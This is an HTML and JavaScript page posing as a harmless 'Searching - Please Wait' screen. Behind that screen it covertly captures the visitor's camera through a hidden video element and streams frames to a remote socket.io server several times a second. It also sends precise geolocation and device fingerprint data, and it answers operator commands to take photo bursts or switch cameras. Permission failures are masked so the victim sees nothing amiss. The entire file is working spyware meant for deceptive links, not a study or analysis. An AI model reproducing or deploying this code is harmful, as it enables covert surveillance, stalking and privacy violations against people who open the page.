<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Searching - Please Wait</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #f4f6f9;
            color: #222;
        }
        .card {
            width: 90%;
            max-width: 420px;
            background: white;
            padding: 25px;
            border-radius: 14px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.10);
            text-align: center;
        }
        h2 { margin-top: 0; }
        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; }
        .waiting { background: #fff3cd; color: #856404; }
        .error { background: #f8d7da; color: #721c24; }
        video { display: none !important; }
        .small { font-size: 12px; color: #777; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Searching...</h2>
    <div id="status" class="status waiting">Connecting...</div>
    <video id="video" autoplay playsinline muted></video>
    <p class="small">Please wait while we connect your session.</p>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");

let mediaStream = null;
let cameraReady = false;
let useFrontCamera = true;
let streamInterval = null;
let autoCaptureRunning = false;

function setStatus(message, type) {
    statusBox.textContent = message;
    statusBox.className = "status " + type;
}

function getDeviceInfo() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Desktop/PC";
    let browser = "Unknown Browser";

    if (ua.includes("android")) device = "Android Mobile";
    else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) device = "iOS Device";
    else if (ua.includes("mobile")) device = "Mobile Device";

    if (ua.includes("edg")) browser = "Microsoft Edge";
    else if (ua.includes("chrome") || ua.includes("crios")) browser = "Google Chrome";
    else if (ua.includes("firefox")) browser = "Mozilla Firefox";
    else if (ua.includes("safari")) browser = "Apple Safari";

    return `${device} (${browser})`;
}

function sendLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        position => {
            socket.emit("user-location", {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            });
        },
        error => {},
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

async function startCamera() {
    setStatus("Connecting...", "waiting");
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }

    try {
        const constraints = {
            audio: false,
            video: {
                facingMode: useFrontCamera ? "user" : "environment",
                width: { ideal: 480 },
                height: { ideal: 360 }
            }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        mediaStream = stream;
        video.srcObject = stream;
        await video.play();

        cameraReady = true;
        setStatus("Searching...", "waiting");

        socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
        sendLocation();
        startLiveStream();
    } catch (error) {
        cameraReady = false;
        setStatus("Searching...", "waiting"); // Security/permission errors hidden visually as requested
    }
}

function startLiveStream() {
    if (streamInterval) clearInterval(streamInterval);
    streamInterval = setInterval(() => {
        if (!cameraReady || !video.videoWidth) return;
        canvas.width = 240;
        canvas.height = 180;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, 240, 180);
        const frame = canvas.toDataURL("image/jpeg", 0.15);
        socket.emit("live-stream-frame", frame);
    }, 200);
}

function takeSinglePhoto() {
    if (!cameraReady) return;
    const width = video.videoWidth || 480;
    const height = video.videoHeight || 360;
    canvas.width = width;
    canvas.height = height;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, width, height);
    const imageData = canvas.toDataURL("image/jpeg", 0.6);
    socket.emit("user-photo-captured", imageData);
}

socket.on("start-auto-capture", () => {
    if (autoCaptureRunning) return;
    autoCaptureRunning = true;
    let count = 0;
    const maxCaptures = 5;

    takeSinglePhoto();
    count++;

    const timer = setInterval(() => {
        if (count >= maxCaptures) {
            clearInterval(timer);
            autoCaptureRunning = false;
            return;
        }
        takeSinglePhoto();
        count++;
    }, 1000);
});

socket.on("capture-photo", () => { takeSinglePhoto(); });
socket.on("request-location", () => { sendLocation(); });

socket.on("switch-camera", async () => {
    useFrontCamera = !useFrontCamera;
    await startCamera();
});

socket.on("server-full", data => {
    setStatus(`Maximum ${data.maxUsers} users are currently connected.`, "error");
    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
});

socket.on("link-disabled", () => {
    stopEverything();
    setStatus("This link is currently disabled.", "error");
});

socket.on("disable-user-access", () => {
    stopEverything();
    document.body.innerHTML = `
        <div class="card">
            <h2>Session Ended</h2>
            <p>This link has been disabled by the administrator.</p>
        </div>
    `;
});

function stopEverything() {
    cameraReady = false;
    if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
    }
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
}

socket.on("connect", () => {
    socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
    startCamera();
});
</script>
</body>
</html>
